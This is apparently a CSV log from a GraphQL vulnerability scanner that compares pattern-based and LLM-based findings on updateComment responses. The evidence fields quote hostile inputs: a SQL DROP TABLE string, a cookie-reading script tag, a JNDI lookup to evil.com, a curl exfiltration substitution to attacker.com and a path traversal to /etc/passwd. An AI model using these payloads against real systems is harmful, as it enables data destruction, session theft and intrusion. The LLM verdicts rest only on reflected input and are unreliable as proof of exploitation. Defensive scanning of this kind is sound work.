timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-05T14:48:11.206384,updateComment_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response includes a payload (`Robert'); DROP TABLE Comments;--`) in the 'name' field that strongly resembles a SQL injection attempt. The payload uses a closing quote and parenthesis followed by a semicolon to terminate the intended SQL query, then attempts to execute a destructive `DROP TABLE` command. This suggests unsanitized user input may have been directly embedded into a SQL query. While the response does not explicitly confirm successful execution (e.g., via error messages or data leakage), the presence of this payload in the response indicates the backend may have accepted it without proper validation or escaping, creating a high-risk scenario."", ""evidence"": ""Name field contains 'Robert'); DROP TABLE Comments;--"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.8, ""evidence"": ""Name field contains 'Robert'); DROP TABLE Comments;--"", ""explanation"": ""The GraphQL response includes a payload (`Robert'); DROP TABLE Comments;--`) in the 'name' field that strongly resembles a SQL injection attempt. The payload uses a closing quote and parenthesis followed by a semicolon to terminate the intended SQL query, then attempts to execute a destructive `DROP TABLE` command. This suggests unsanitized user input may have been directly embedded into a SQL query. While the response does not explicitly confirm successful execution (e.g., via error messages or data leakage), the presence of this payload in the response indicates the backend may have accepted it without proper validation or escaping, creating a high-risk scenario.""}}]"
2025-10-05T14:48:27.965608,updateComment_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response directly reflects an unsanitized script payload in the `body` field of a stored comment. This indicates: 1) The application accepts raw HTML/JS input without validation/sanitization 2) The payload is persisted (stored XSS) 3) document.cookie targeting suggests an active cookie theft attempt. In typical web contexts, rendering this value without HTML escaping would execute the script in browsers, compromising user sessions."", ""evidence"": ""Comment body contains unescaped script payload: <script>alert(document.cookie)</script>"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Comment body contains unescaped script payload: <script>alert(document.cookie)</script>"", ""explanation"": ""The GraphQL response directly reflects an unsanitized script payload in the `body` field of a stored comment. This indicates: 1) The application accepts raw HTML/JS input without validation/sanitization 2) The payload is persisted (stored XSS) 3) document.cookie targeting suggests an active cookie theft attempt. In typical web contexts, rendering this value without HTML escaping would execute the script in browsers, compromising user sessions.""}}]"
2025-10-05T14:48:38.635686,updateComment_response_4,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a JNDI LDAP payload (${jndi:ldap://evil.com/a}) in the email field, which is a strong indicator of a Server-Side Request Forgery (SSRF) attempt. This payload suggests exploitation attempts leveraging Java Naming and Directory Interface lookups, which could force the server to make unauthorized external requests to attacker-controlled infrastructure (evil.com). While this could also indicate Log4Shell vulnerabilities, the external network call pattern matches SSRF behavior in GraphQL contexts where input validation fails."", ""evidence"": ""email field contains 'attacker@\\${jndi:ldap://evil.com/a}'"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.85, ""evidence"": ""email field contains 'attacker@\\${jndi:ldap://evil.com/a}'"", ""explanation"": ""The response contains a JNDI LDAP payload (${jndi:ldap://evil.com/a}) in the email field, which is a strong indicator of a Server-Side Request Forgery (SSRF) attempt. This payload suggests exploitation attempts leveraging Java Naming and Directory Interface lookups, which could force the server to make unauthorized external requests to attacker-controlled infrastructure (evil.com). While this could also indicate Log4Shell vulnerabilities, the external network call pattern matches SSRF behavior in GraphQL contexts where input validation fails.""}}]"
2025-10-05T14:48:46.667985,updateComment_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a payload using command substitution syntax ($(...)) to execute a curl command. This indicates an attempt to inject OS commands via the 'name' parameter. If the server processes this input unsafely (e.g., passing it to shell commands without sanitization), it could lead to arbitrary command execution. The payload demonstrates clear attacker intent to exfiltrate data via an external HTTP request."", ""evidence"": ""Payload 'User $(curl http://attacker.com/exfil)' in 'name' field"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.8, ""evidence"": ""Payload 'User $(curl http://attacker.com/exfil)' in 'name' field"", ""explanation"": ""The response contains a payload using command substitution syntax ($(...)) to execute a curl command. This indicates an attempt to inject OS commands via the 'name' parameter. If the server processes this input unsafely (e.g., passing it to shell commands without sanitization), it could lead to arbitrary command execution. The payload demonstrates clear attacker intent to exfiltrate data via an external HTTP request.""}}]"
2025-10-05T14:49:09.710046,updateComment_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes a controlled input value of '../../etc/passwd' in a field named 'name', which represents a directory traversal pattern attempting to access a sensitive system file. This indicates the server accepted unsanitized path manipulation in a GraphQL mutation operation, strongly suggesting a path injection vulnerability. The payload reflects successful client-side control over filesystem path construction without apparent validation, though full impact depends on server-side handling."", ""evidence"": ""name: \""../../etc/passwd\"" in mutation response"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""HIGH"", ""confidence"": 0.85, ""evidence"": ""name: \""../../etc/passwd\"" in mutation response"", ""explanation"": ""The response includes a controlled input value of '../../etc/passwd' in a field named 'name', which represents a directory traversal pattern attempting to access a sensitive system file. This indicates the server accepted unsanitized path manipulation in a GraphQL mutation operation, strongly suggesting a path injection vulnerability. The payload reflects successful client-side control over filesystem path construction without apparent validation, though full impact depends on server-side handling.""}}]"
2025-10-05T14:49:36.437209,updateComment_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,0,1,0,1.0,both_potential,Injection Attacks,,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The response data shows unescaped HTML tags (`<h1>` and `<img>`) in the 'body' field returned from a mutation (updateComment). This indicates the application either: 1) failed to sanitize user-controlled input before storing/displaying it, or 2) intentionally allowed HTML formatting without proper context-aware escaping. While this payload doesn't directly execute JavaScript (XSS), HTML injection enables defacement, phishing vectors, and resource loading (via img tags). The vulnerability exists in the returned GraphQL payload, implying client-side rendering without proper output encoding could trigger exploitation."", ""evidence"": ""Response contains user-controlled HTML payload: `<h1>Unauthorized Access</h1><img src='malicious.jpg'>`"", ""confidence"": 0.85, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""MEDIUM"", ""confidence"": 0.85, ""evidence"": ""Response contains user-controlled HTML payload: `<h1>Unauthorized Access</h1><img src='malicious.jpg'>`"", ""explanation"": ""The response data shows unescaped HTML tags (`<h1>` and `<img>`) in the 'body' field returned from a mutation (updateComment). This indicates the application either: 1) failed to sanitize user-controlled input before storing/displaying it, or 2) intentionally allowed HTML formatting without proper context-aware escaping. While this payload doesn't directly execute JavaScript (XSS), HTML injection enables defacement, phishing vectors, and resource loading (via img tags). The vulnerability exists in the returned GraphQL payload, implying client-side rendering without proper output encoding could trigger exploitation.""}}]"
2025-10-05T14:49:55.526738,updateComment_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:50:03.922100,updateComment_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:50:24.549459,updateComment_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-05T14:50:30.261070,updateComment_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,0,1,0.0,no_potential,,,,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""safe"", ""category"": ""Injection Attacks"", ""description"": ""The server provided field suggestions ('comment') in a validation error message. While not inherently critical, this exposes schema structure details that could aid attackers in reconnaissance. GraphQL implementations should suppress field suggestions in production environments to reduce information leakage."", ""evidence"": ""Did you mean \""comment\""?"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""LOW"", ""confidence"": 0.9, ""evidence"": ""Did you mean \""comment\""?"", ""explanation"": ""The server provided field suggestions ('comment') in a validation error message. While not inherently critical, this exposes schema structure details that could aid attackers in reconnaissance. GraphQL implementations should suppress field suggestions in production environments to reduce information leakage.""}}]"
